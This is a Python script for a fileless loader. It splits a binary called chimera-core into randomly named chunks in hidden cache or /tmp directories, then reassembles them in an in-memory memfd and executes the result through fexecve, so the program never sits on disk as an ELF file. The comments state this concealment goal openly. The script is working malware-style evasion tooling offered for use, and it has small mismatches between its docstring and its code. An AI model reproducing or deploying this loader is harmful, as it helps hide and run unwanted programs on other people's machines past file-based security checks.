#!/usr/bin/env python3
"""
Chunked binary loader — splits chimera-core into N random-sized pieces,
stores them scrambled on disk, reassembles into a tmpfs/memfd at runtime,
then execv's the reassembled binary.

On disk layout (in ~/.cache/worker/ or /tmp/.<random>/):
  piece_00  piece_01  piece_02  ...  piece_NN   manifest.bin

manifest.bin contains:
  [4 bytes] piece count
  [4 bytes per piece] original offset
  [4 bytes per piece] size
  [32 bytes per piece] sha256 of piece

All piece files are named with random hex strings, not sequential numbers.
Reassembly happens in a memfd (in-memory file) — never touches disk as ELF.
"""

import os
import sys
import random
import struct
import hashlib
import tempfile
import shutil
import ctypes
import ctypes.util

# ── constants ─────────────────────────────────────────────────────────────────
CHUNK_MIN = 32  * 1024   #  32 KB
CHUNK_MAX = 256 * 1024   # 256 KB
MANIFEST  = "mf.bin"

# ── libc for memfd_create + fexecve ──────────────────────────────────────────
_libc_path = ctypes.util.find_library('c')
_libc = ctypes.CDLL(_libc_path, use_errno=True)

def memfd_create(name: str, flags: int = 0) -> int:
    """Wrapper for memfd_create(2)"""
    _memfd = _libc.memfd_create
    _memfd.restype  = ctypes.c_int
    _memfd.argtypes = [ctypes.c_char_p, ctypes.c_uint]
    fd = _memfd(name.encode(), flags)
    if fd < 0:
        raise OSError(ctypes.get_errno(), f"memfd_create failed")
    return fd

def fexecve(fd: int, argv: list[str], envp: dict):
    """Wrapper for fexecve(3) — exec from a file descriptor"""
    _fexecve = _libc.fexecve
    _fexecve.restype  = ctypes.c_int

    c_argv = (ctypes.c_char_p * (len(argv) + 1))(
        *[a.encode() for a in argv], None
    )
    env_list = [f"{k}={v}".encode() for k, v in envp.items()]
    c_envp = (ctypes.c_char_p * (len(env_list) + 1))(*env_list, None)

    _fexecve(fd, c_argv, c_envp)
    raise OSError(ctypes.get_errno(), "fexecve failed")


# ── split binary into chunks ──────────────────────────────────────────────────
def split_binary(src_path: str, out_dir: str) -> str:
    """
    Split src_path into random-sized chunks stored in out_dir.
    Returns path to manifest file.
    Pieces are stored with random hex filenames, shuffled order on disk.
    """
    os.makedirs(out_dir, exist_ok=True)

    with open(src_path, 'rb') as f:
        data = f.read()

    total = len(data)
    pieces = []   # list of (offset, size, data)

    offset = 0
    while offset < total:
        size = min(random.randint(CHUNK_MIN, CHUNK_MAX), total - offset)
        pieces.append((offset, size, data[offset:offset+size]))
        offset += size

    # Write pieces with random names
    names = []
    for i, (off, sz, chunk_data) in enumerate(pieces):
        name = os.urandom(8).hex() + ".dat"
        path = os.path.join(out_dir, name)
        with open(path, 'wb') as f:
            f.write(chunk_data)
        sha = hashlib.sha256(chunk_data).digest()
        names.append((name, off, sz, sha))

    # Write manifest: magic + count + entries
    manifest_path = os.path.join(out_dir, MANIFEST)
    with open(manifest_path, 'wb') as f:
        magic = b'CHMR'
        f.write(magic)
        f.write(struct.pack('<I', len(names)))
        for name, off, sz, sha in names:
            name_b = name.encode().ljust(32, b'\x00')[:32]
            f.write(name_b)
            f.write(struct.pack('<II', off, sz))
            f.write(sha)

    return manifest_path


# ── reassemble chunks into memfd ──────────────────────────────────────────────
def assemble_to_memfd(chunk_dir: str, label: str = "worker", fake_name: str = None) -> int:
    """
    Read manifest, verify each piece, reassemble in correct order into memfd.
    Returns open file descriptor pointing to the complete ELF (seeked to 0).
    """
    manifest_path = os.path.join(chunk_dir, MANIFEST)
    with open(manifest_path, 'rb') as f:
        magic = f.read(4)
        assert magic == b'CHMR', "Bad manifest magic"
        count = struct.unpack('<I', f.read(4))[0]
        entries = []
        for _ in range(count):
            name  = f.read(32).rstrip(b'\x00').decode()
            off, sz = struct.unpack('<II', f.read(8))
            sha   = f.read(32)
            entries.append((name, off, sz, sha))

    # Sort by original offset to reassemble correctly
    entries.sort(key=lambda e: e[1])

    # Allocate buffer for full binary
    total_size = sum(sz for _, _, sz, _ in entries)
    buf = bytearray(total_size)

    for name, off, sz, expected_sha in entries:
        path = os.path.join(chunk_dir, name)
        with open(path, 'rb') as f:
            chunk_data = f.read()
        actual_sha = hashlib.sha256(chunk_data).digest()
        assert actual_sha == expected_sha, f"Integrity check failed for {name}"
        buf[off:off+sz] = chunk_data

    # Write to memfd
    fd = memfd_create(label)
    os.write(fd, bytes(buf))
    os.lseek(fd, 0, os.SEEK_SET)
    return fd


# ── high-level: split once at install time ────────────────────────────────────
def install_chunks(src_binary: str, store_dir: str):
    """
    Called once to split the binary into chunks on disk.
    Re-run to reshuffle (produces new random names each time).
    """
    # Clean old chunks
    if os.path.exists(store_dir):
        shutil.rmtree(store_dir)
    manifest = split_binary(src_binary, store_dir)
    pieces = len([f for f in os.listdir(store_dir) if f.endswith('.dat')])
    total_kb = os.path.getsize(src_binary) // 1024
    print(f"[loader] split {src_binary} → {pieces} chunks in {store_dir}  ({total_kb} KB total)", flush=True)
    return store_dir


# ── high-level: load + exec ───────────────────────────────────────────────────
def exec_from_chunks(chunk_dir: str, argv: list[str], extra_env: dict = None):
    """
    Reassemble binary from chunks into memfd, then fexecve.
    This replaces the current process image — does not return on success.
    """
    fd = assemble_to_memfd(chunk_dir)

    env = dict(os.environ)
    if extra_env:
        env.update(extra_env)

    # Make executable via /proc/self/fd/<n>
    fd_path = f"/proc/self/fd/{fd}"
    os.chmod(fd_path, 0o700) if os.path.exists(fd_path) else None

    try:
        fexecve(fd, argv, env)
    except OSError:
        # fallback: write to temp file and exec normally
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.bin')
        os.lseek(fd, 0, os.SEEK_SET)
        tmp.write(os.read(fd, os.fstat(fd).st_size))
        tmp.close()
        os.chmod(tmp.name, 0o700)
        os.close(fd)
        os.execve(tmp.name, argv, env)


# ── CLI ───────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest='cmd')

    sp = sub.add_parser('split', help='Split binary into chunks')
    sp.add_argument('binary')
    sp.add_argument('outdir')

    lp = sub.add_parser('exec', help='Reassemble and exec')
    lp.add_argument('chunkdir')
    lp.add_argument('args', nargs=argparse.REMAINDER)

    args = p.parse_args()

    if args.cmd == 'split':
        install_chunks(args.binary, args.outdir)

    elif args.cmd == 'exec':
        argv = args.args if args.args else [args.chunkdir]
        exec_from_chunks(args.chunkdir, argv)

    else:
        p.print_help()
